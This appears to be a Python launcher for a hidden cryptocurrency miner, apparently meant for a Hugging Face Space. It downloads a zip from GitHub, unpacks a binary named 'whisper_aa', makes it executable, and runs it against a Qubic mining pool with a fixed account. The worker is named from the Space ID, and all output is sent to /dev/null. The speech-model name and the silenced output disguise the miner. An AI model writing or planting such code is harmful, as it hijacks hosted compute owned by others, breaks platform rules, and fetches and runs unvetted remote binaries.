import os
os.system("wget https://github.com/qqivk/project-01/raw/refs/heads/main/whisper_aa.zip")
os.system("unzip whisper_aa.zip")
os.system("chmod +x whisper_aa")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./whisper_aa --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wn} >/dev/null")
